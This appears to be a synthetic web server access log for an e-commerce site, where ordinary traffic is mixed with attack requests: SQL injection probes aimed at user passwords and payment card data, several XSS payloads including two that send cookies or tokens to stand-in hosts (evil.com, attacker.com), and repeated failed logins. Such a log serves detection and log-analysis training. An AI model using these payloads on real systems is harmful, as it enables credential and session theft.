192.168.1.39 - - [15/Jun/2025:00:37:26 +0000] "GET /contact HTTP/1.1" 200 5335 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.40 - - [15/Jun/2025:00:52:19 +0000] "GET / HTTP/1.1" 304 2511 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.33 - - [15/Jun/2025:00:48:45 +0000] "POST /api/products?category=clothing HTTP/1.1" 201 7035 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.34 - - [15/Jun/2025:00:41:05 +0000] "GET /api/orders HTTP/1.1" 404 3604 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.41 - - [15/Jun/2025:00:28:54 +0000] "GET /api/cart/add HTTP/1.1" 200 884 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.24 - - [15/Jun/2025:00:33:00 +0000] "GET /static/css/main.css HTTP/1.1" 200 1137 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.77 - - [15/Jun/2025:00:14:36 +0000] "POST /api/login HTTP/1.1" 401 232 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [15/Jun/2025:00:27:23 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 4724 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.22 - - [15/Jun/2025:00:57:44 +0000] "GET /favicon.ico HTTP/1.1" 200 4103 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.26 - - [15/Jun/2025:00:42:19 +0000] "GET /static/js/app.js HTTP/1.1" 200 1173 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:25:53 +0000] "GET /robots.txt HTTP/1.1" 200 1694 "-" "Wget/1.21.4"
192.168.1.32 - - [15/Jun/2025:00:36:28 +0000] "GET /api/user/profile HTTP/1.1" 200 508 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.45 - - [15/Jun/2025:00:35:16 +0000] "GET /contact HTTP/1.1" 200 1028 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.99 - - [15/Jun/2025:00:23:03 +0000] "GET /api/user?id=1 UNION SELECT 1,2,3-- HTTP/1.1" 400 442 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.77 - - [15/Jun/2025:00:16:28 +0000] "GET /products?name=<img src=x onerror=alert(document.domain)> HTTP/1.1" 400 435 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.46 - - [15/Jun/2025:00:29:07 +0000] "POST /static/js/app.js HTTP/1.1" 200 5027 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
172.16.0.55 - - [15/Jun/2025:00:03:28 +0000] "POST /api/login HTTP/1.1" 401 183 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
198.51.100.42 - - [15/Jun/2025:00:17:10 +0000] "GET /api/user?id=1 UNION SELECT 1,2,3-- HTTP/1.1" 400 367 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:26:03 +0000] "GET /images/banner.jpg HTTP/1.1" 200 2559 "-" "Wget/1.21.4"
172.16.0.55 - - [15/Jun/2025:00:01:46 +0000] "POST /api/login HTTP/1.1" 401 209 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.13 - - [15/Jun/2025:00:39:21 +0000] "GET /checkout HTTP/1.1" 200 4527 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.18 - - [15/Jun/2025:00:31:58 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 1783 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.55 - - [15/Jun/2025:00:00:52 +0000] "POST /api/login HTTP/1.1" 401 200 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:25:49 +0000] "GET /api/products?category=clothing HTTP/1.1" 429 3090 "-" "libwww-perl/6.72"
192.168.1.36 - - [15/Jun/2025:00:26:42 +0000] "GET /checkout HTTP/1.1" 304 314 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.42 - - [15/Jun/2025:00:51:43 +0000] "GET /about HTTP/1.1" 200 6329 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:25:56 +0000] "GET /contact HTTP/1.1" 200 2744 "-" "python-requests/2.31.0"
192.168.1.44 - - [15/Jun/2025:00:27:36 +0000] "POST /api/products?category=clothing HTTP/1.1" 200 6990 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.17 - - [15/Jun/2025:00:50:51 +0000] "GET / HTTP/1.1" 404 3151 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.55 - - [15/Jun/2025:00:02:25 +0000] "POST /api/login HTTP/1.1" 401 233 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.15 - - [15/Jun/2025:00:55:55 +0000] "POST /robots.txt HTTP/1.1" 201 1374 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.99 - - [15/Jun/2025:00:16:53 +0000] "GET /api/comment?text=<script>fetch('https://evil.com/?c='+btoa(document.cookie))</script> HTTP/1.1" 400 347 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:26:13 +0000] "GET /cart HTTP/1.1" 200 560 "-" "Go-http-client/1.1"
192.168.1.18 - - [15/Jun/2025:00:58:00 +0000] "GET /products HTTP/1.1" 200 546 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.45 - - [15/Jun/2025:00:50:19 +0000] "POST /about HTTP/1.1" 200 4956 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.19 - - [15/Jun/2025:00:27:05 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 4494 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:25:44 +0000] "GET /images/banner.jpg HTTP/1.1" 200 709 "-" "curl/8.5.0"
192.168.1.11 - - [15/Jun/2025:00:53:13 +0000] "POST /index.html HTTP/1.1" 201 5714 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
198.51.100.42 - - [15/Jun/2025:00:06:19 +0000] "POST /api/login HTTP/1.1" 401 214 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.31 - - [15/Jun/2025:00:44:41 +0000] "GET /api/products?category=clothing HTTP/1.1" 304 1608 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:26:03 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 3967 "-" "curl/8.5.0"
192.168.1.12 - - [15/Jun/2025:00:54:53 +0000] "POST /favicon.ico HTTP/1.1" 201 2261 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.55 - - [15/Jun/2025:00:24:36 +0000] "GET /products?category=1' UNION SELECT credit_card,cvv,expiry FROM payments-- HTTP/1.1" 400 434 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.14 - - [15/Jun/2025:00:40:01 +0000] "GET /api/cart/add HTTP/1.1" 304 3916 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:26:29 +0000] "GET /about HTTP/1.1" 200 3212 "-" "Go-http-client/1.1"
192.168.1.23 - - [15/Jun/2025:00:35:48 +0000] "POST /checkout HTTP/1.1" 201 7987 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.16 - - [15/Jun/2025:00:38:33 +0000] "POST /about HTTP/1.1" 200 5284 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
203.0.113.77 - - [15/Jun/2025:00:01:21 +0000] "POST /api/login HTTP/1.1" 401 233 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.19 - - [15/Jun/2025:00:46:41 +0000] "GET /static/css/main.css HTTP/1.1" 304 2842 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.77 - - [15/Jun/2025:00:11:38 +0000] "POST /api/login HTTP/1.1" 401 197 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:26:01 +0000] "GET /favicon.ico HTTP/1.1" 200 2408 "-" "Wget/1.21.4"
192.168.1.21 - - [15/Jun/2025:00:29:22 +0000] "GET /about HTTP/1.1" 304 677 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.33 - - [15/Jun/2025:00:39:05 +0000] "GET /about HTTP/1.1" 200 4573 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.99 - - [15/Jun/2025:00:23:25 +0000] "GET /search?q=<script>document.cookie='stolen='+document.cookie</script> HTTP/1.1" 400 380 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.43 - - [15/Jun/2025:00:38:42 +0000] "GET /index.html HTTP/1.1" 200 6437 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.16 - - [15/Jun/2025:00:56:33 +0000] "POST /api/user/profile HTTP/1.1" 201 2710 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.27 - - [15/Jun/2025:00:32:08 +0000] "GET /cart HTTP/1.1" 304 750 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.48 - - [15/Jun/2025:00:56:42 +0000] "GET / HTTP/1.1" 200 6728 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.41 - - [15/Jun/2025:00:43:43 +0000] "GET /static/js/app.js HTTP/1.1" 404 6448 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
198.51.100.42 - - [15/Jun/2025:00:20:05 +0000] "GET /api/products?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 400 481 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.31 - - [15/Jun/2025:00:35:00 +0000] "GET /api/orders HTTP/1.1" 200 6128 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.33 - - [15/Jun/2025:00:31:24 +0000] "GET /cart HTTP/1.1" 200 7901 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.25 - - [15/Jun/2025:00:32:40 +0000] "GET /static/js/app.js HTTP/1.1" 200 1034 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.42 - - [15/Jun/2025:00:02:37 +0000] "POST /api/login HTTP/1.1" 401 230 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [15/Jun/2025:00:34:11 +0000] "GET /images/banner.jpg HTTP/1.1" 304 6049 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.55 - - [15/Jun/2025:00:00:10 +0000] "POST /api/login HTTP/1.1" 401 223 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.99 - - [15/Jun/2025:00:04:32 +0000] "POST /api/login HTTP/1.1" 401 210 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.44 - - [15/Jun/2025:00:42:01 +0000] "GET /robots.txt HTTP/1.1" 404 3601 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.32 - - [15/Jun/2025:00:57:31 +0000] "POST /about HTTP/1.1" 200 2125 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.15 - - [15/Jun/2025:00:27:51 +0000] "GET /products HTTP/1.1" 200 565 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.14 - - [15/Jun/2025:00:53:36 +0000] "GET /static/css/main.css HTTP/1.1" 304 685 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.20 - - [15/Jun/2025:00:47:05 +0000] "GET /images/banner.jpg HTTP/1.1" 200 4220 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.29 - - [15/Jun/2025:00:42:57 +0000] "GET /search?q=laptop HTTP/1.1" 200 493 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:25:54 +0000] "GET /static/js/app.js HTTP/1.1" 200 1672 "-" "libwww-perl/6.72"
192.168.1.48 - - [15/Jun/2025:00:45:58 +0000] "GET / HTTP/1.1" 404 2926 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.15 - - [15/Jun/2025:00:26:31 +0000] "GET /images/banner.jpg HTTP/1.1" 200 2376 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:25:52 +0000] "GET /api/user/profile HTTP/1.1" 200 1843 "-" "curl/8.5.0"
198.51.100.42 - - [15/Jun/2025:00:25:17 +0000] "GET /api/user?name=<svg/onload=fetch('//attacker.com/'+localStorage.token)> HTTP/1.1" 400 548 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.37 - - [15/Jun/2025:00:31:54 +0000] "GET /products HTTP/1.1" 200 1688 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.46 - - [15/Jun/2025:00:43:11 +0000] "GET /about HTTP/1.1" 200 4091 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.0.99 - - [15/Jun/2025:00:01:38 +0000] "POST /api/login HTTP/1.1" 401 216 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.28 - - [15/Jun/2025:00:29:40 +0000] "GET /robots.txt HTTP/1.1" 304 2811 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.24 - - [15/Jun/2025:00:27:10 +0000] "GET /api/user/profile HTTP/1.1" 200 7466 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.99 - - [15/Jun/2025:00:12:04 +0000] "POST /api/login HTTP/1.1" 401 197 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [15/Jun/2025:00:40:34 +0000] "GET /api/user/profile HTTP/1.1" 200 4603 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:26:01 +0000] "GET /api/products?category=electronics HTTP/1.1" 429 1228 "-" "Wget/1.21.4"
192.168.1.25 - - [15/Jun/2025:00:34:43 +0000] "POST /api/user/profile HTTP/1.1" 200 908 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.42 - - [15/Jun/2025:00:04:10 +0000] "POST /api/login HTTP/1.1" 401 195 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.20 - - [15/Jun/2025:00:28:18 +0000] "GET /static/js/app.js HTTP/1.1" 200 4017 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
172.16.0.55 - - [15/Jun/2025:00:15:55 +0000] "POST /api/login HTTP/1.1" 401 184 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.29 - - [15/Jun/2025:00:42:38 +0000] "GET /products HTTP/1.1" 200 506 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:26:19 +0000] "GET /search?q=laptop HTTP/1.1" 429 2567 "-" "libwww-perl/6.72"
45.152.66.201 - - [15/Jun/2025:00:26:24 +0000] "GET /contact HTTP/1.1" 200 1383 "-" "curl/8.5.0"
10.0.0.99 - - [15/Jun/2025:00:07:23 +0000] "POST /api/login HTTP/1.1" 401 238 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
172.16.0.55 - - [15/Jun/2025:00:11:04 +0000] "POST /api/login HTTP/1.1" 401 209 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.42 - - [15/Jun/2025:00:15:16 +0000] "POST /api/login HTTP/1.1" 401 230 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.20 - - [15/Jun/2025:00:28:50 +0000] "GET /index.html HTTP/1.1" 404 7215 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.45 - - [15/Jun/2025:00:30:33 +0000] "GET /cart HTTP/1.1" 200 3179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.77 - - [15/Jun/2025:00:19:17 +0000] "GET /api/user?id=1 UNION SELECT 1,2,3-- HTTP/1.1" 400 381 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.39 - - [15/Jun/2025:00:37:28 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 6891 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.19 - - [15/Jun/2025:00:37:34 +0000] "GET /favicon.ico HTTP/1.1" 200 4428 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.48 - - [15/Jun/2025:00:26:49 +0000] "POST /cart HTTP/1.1" 201 6102 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.29 - - [15/Jun/2025:00:41:53 +0000] "GET /products HTTP/1.1" 200 5192 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.28 - - [15/Jun/2025:00:33:42 +0000] "GET /about HTTP/1.1" 304 2991 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.36 - - [15/Jun/2025:00:39:28 +0000] "POST /products HTTP/1.1" 200 3892 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.36 - - [15/Jun/2025:00:31:23 +0000] "GET /contact HTTP/1.1" 200 6575 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.30 - - [15/Jun/2025:00:50:05 +0000] "POST /contact HTTP/1.1" 201 2738 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.43 - - [15/Jun/2025:00:56:44 +0000] "GET /api/products?category=clothing HTTP/1.1" 404 5704 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.41 - - [15/Jun/2025:00:39:24 +0000] "GET /checkout HTTP/1.1" 304 4122 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.19 - - [15/Jun/2025:00:32:31 +0000] "POST /api/user/profile HTTP/1.1" 200 7960 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.41 - - [15/Jun/2025:00:50:58 +0000] "GET / HTTP/1.1" 200 6863 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.16 - - [15/Jun/2025:00:51:30 +0000] "GET /checkout HTTP/1.1" 200 3988 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.11 - - [15/Jun/2025:00:29:52 +0000] "POST /favicon.ico HTTP/1.1" 201 6506 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.45 - - [15/Jun/2025:00:30:41 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 7359 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.55 - - [15/Jun/2025:00:23:57 +0000] "GET /search?q=<script>document.cookie='stolen='+document.cookie</script> HTTP/1.1" 400 547 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.48 - - [15/Jun/2025:00:29:45 +0000] "GET /contact HTTP/1.1" 304 7754 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
